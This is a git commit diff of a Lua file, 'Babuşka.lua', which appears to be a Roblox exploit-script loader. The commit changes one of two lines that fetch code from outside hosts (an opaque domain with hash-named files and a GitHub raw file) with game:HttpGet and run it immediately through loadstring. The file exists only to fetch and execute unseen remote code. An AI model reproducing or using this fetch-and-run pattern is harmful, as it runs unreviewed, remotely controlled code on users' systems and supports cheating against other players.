caabd8bb4e1b8f3c4312619c86061164fa68d095
XCOM9J <abbasasbasb@gmail.com>
2024-05-23 22:47:46 +0300

    Update Babuşka.lua

--- Babuşka.lua
+++ Babuşka.lua
@@ -1,3 +1,3 @@
-loadstring(game:HttpGet('https://egorikusa.space/ac014ab3c4294f260c79eafb.lua'))()
+loadstring(game:HttpGet('https://egorikusa.space/f3970816b4cb22ec867a439f.lua'))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LegendaryScript/LegendaryScript/main/LegendaryRBXScript.lua", true))()
